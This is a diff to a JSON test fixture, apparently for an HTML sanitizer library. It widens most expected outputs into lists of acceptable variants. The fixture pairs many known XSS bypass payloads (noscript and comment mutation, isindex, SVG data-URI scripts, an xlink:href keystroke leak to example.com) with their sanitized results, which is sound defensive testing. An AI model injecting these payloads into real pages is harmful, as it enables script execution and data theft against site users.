@@ -92,12 +92,12 @@
     {
         "title": "Img element inside nocript terminated inside comment",
         "payload": "<b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>",
-        "expected": "<b></b>"
+        "expected": ["<b></b>", "<b><img src=\"xx:\"></b>"]
     },
     {
         "title": "Img element inside noscript terminated inside attribute",
         "payload": "<b><noscript><a alt=\"</noscript><img src=xx: onerror=alert(1)>\"></noscript>",
-        "expected": "<b></b>"
+        "expected": ["<b></b>", "<b><img src=\"xx:\">\"&gt;</b>"]
     },
     {
         "title": "Img element inside shadow DOM template",
@@ -133,7 +133,10 @@
     },
     {
         "payload": "<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\" mathbackground=\"#80FF80\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>",
-        "expected": "<math display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>"
+        "expected": [
+                        "<math display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose mathbackground=\"#80FF80\" mathcolor=\"#FF0000\" notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>",
+                        "<math display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>"
+                    ]
     },
     {
         "payload": "<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>",
@@ -165,7 +168,10 @@
     },
     {
         "payload": "<isindex x=\"javascript:\" onmouseover=\"alert(1)\" label=\"variation of bypass by @giutro\">",
-        "expected": "<form><hr><label>This is a searchable index. Enter search keywords: <input name=\"isindex\" label=\"variation of bypass by @giutro\"></label><hr></form>"
+        "expected": [
+                        "<form><hr><label>This is a searchable index. Enter search keywords: <input label=\"variation of bypass by @giutro\" name=\"isindex\"></label><hr></form>",
+                        "<form><hr><label>This is a searchable index. Enter search keywords: <input name=\"isindex\" label=\"variation of bypass by @giutro\"></label><hr></form>"
+                    ]
     },
     {
         "payload": "<div wow=removeme onmouseover=alert(1)>text",
@@ -177,7 +183,10 @@
     },
     {
         "payload": "<isindex src=\"javascript:\" onmouseover=\"alert(1)\" label=\"bypass by @giutro\" />",
-        "expected": "<form><hr><label>This is a searchable index. Enter search keywords: <input name=\"isindex\" label=\"bypass by @giutro\"></label><hr></form>"
+        "expected": [
+                        "<form><hr><label>This is a searchable index. Enter search keywords: <input name=\"isindex\" label=\"bypass by @giutro\"></label><hr></form>",
+                        "<form><hr><label>This is a searchable index. Enter search keywords: <input label=\"bypass by @giutro\" name=\"isindex\"></label><hr></form>"
+                    ]
     },
     {
         "payload": "<a href=\"javascript:123\" onclick=\"alert(1)\">CLICK ME (bypass by @shafigullin)</a>",
@@ -305,7 +314,7 @@
     },
     {
         "payload": "<div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div>",
-        "expected": false
+        "expected": ""
     },
     {
         "payload": "<div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div>",
@@ -337,7 +346,10 @@
     },
     {
         "payload": "<![><img src=\"]><img src=x onerror=alert(39)//\">",
-        "expected": "<img src=\"]&gt;&lt;img src=x onerror=alert(39)//\">"
+        "expected": [
+                        "<img src=\"]&gt;&lt;img src=x onerror=alert(39)//\">",
+                        "<img src=\"]><img src=x onerror=alert(39)//\">"
+                    ]
     },
     {
         "payload": "<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href=\"]]><img src=xx:x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>",
@@ -589,7 +601,10 @@
     },
     {
         "payload": "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"102\"><img src=\"x` `&lt;script&gt;alert(102)&lt;/script&gt;\">//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"102\"><img src=\"x` `&lt;script&gt;alert(102)&lt;/script&gt;\">//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\">//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "payload": "<div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>",
@@ -609,7 +624,10 @@
     },
     {
         "payload": "<div id=\"108\"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=xx:x onerror=alert(108)></a>\">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(2)//\">\n<?a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(3)//\">//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a><img alt=\"`&gt;&lt;img src=xx:x onerror=alert(108)&gt;&lt;/a&gt;\">\n\n<img alt=\"`&gt;&lt;img src=xx:x onerror=alert(2)//\">\n<img alt=\"`&gt;&lt;img src=xx:x onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a><img alt=\"`&gt;&lt;img src=xx:x onerror=alert(108)&gt;&lt;/a&gt;\">\n\n<img alt=\"`&gt;&lt;img src=xx:x onerror=alert(2)//\">\n<img alt=\"`&gt;&lt;img src=xx:x onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"108\">\n<a href=\"http://foo.bar/#x=`y\"></a><img alt=\"`><img src=xx:x onerror=alert(108)></a>\">\n\n<img alt=\"`><img src=xx:x onerror=alert(2)//\">\n<img alt=\"`><img src=xx:x onerror=alert(3)//\">//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "payload": "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>\n<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>\n</svg>//[\"'`-->]]>]</div>",
@@ -696,7 +714,10 @@
     {
         "title": "Inline SVG (data-uri)",
         "payload": "<div id=\"129\"><svg><image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"129\"><svg><image style=\"filter:url(&quot;data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22&gt;&lt;script&gt;parent.alert(129)&lt;/script&gt;&lt;/svg&gt;&quot;)\">\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"129\"><svg><image style=\"filter:url(&quot;data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22&gt;&lt;script&gt;parent.alert(129)&lt;/script&gt;&lt;/svg&gt;&quot;)\">\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"129\"><svg><image style=\"filter:url(&quot;data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>&quot;)\">\n\n</image></svg>//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "title": "MathML",
@@ -710,7 +731,10 @@
     },
     {
         "payload": "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "payload": "<div id=\"133\"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[\"'`-->]]>]</div>",
@@ -719,7 +743,10 @@
     {
         "title": "XMP",
         "payload": "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"134\">\n<img alt=\"%&gt;&lt;/xmp&gt;&lt;img src=xx:x onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*['<!--']{}\n</style>\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"134\">\n<img alt=\"%&gt;&lt;/xmp&gt;&lt;img src=xx:x onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*['<!--']{}\n</style>\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"134\">\n<img alt=\"%></xmp><img src=xx:x onerror=alert(134)//\">\n\n %&gt;/\nalert(2)\n\n\nXXX\n<style>\n*['<!--']{}\n</style>\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "title": "SVG",
@@ -728,7 +755,10 @@
     },
     {
         "payload": "<div id=\"136\"><form action=\"\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" dirname=\"password\" />\n<input type=\"submit\">\n</form>//[\"'`-->]]>]</div>",
-        "expected": "<div id=\"136\"><form method=\"post\" action=\"\">\n<input value=\"admin\" name=\"username\">\n<input value=\"secret\" type=\"password\" name=\"password\">\n<input value=\"injected\" name=\"injected\">\n<input type=\"submit\">\n</form>//[\"'`--&gt;]]&gt;]</div>"
+        "expected": [
+                        "<div id=\"136\"><form method=\"post\" action=\"\">\n<input value=\"admin\" name=\"username\">\n<input value=\"secret\" type=\"password\" name=\"password\">\n<input value=\"injected\" name=\"injected\">\n<input type=\"submit\">\n</form>//[\"'`--&gt;]]&gt;]</div>",
+                        "<div id=\"136\"><form method=\"post\" action=\"\">\n<input value=\"admin\" name=\"username\">\n<input value=\"secret\" name=\"password\" type=\"password\">\n<input value=\"injected\" name=\"injected\">\n<input type=\"submit\">\n</form>//[\"'`--&gt;]]&gt;]</div>"
+                    ]
     },
     {
         "title": "SVG",
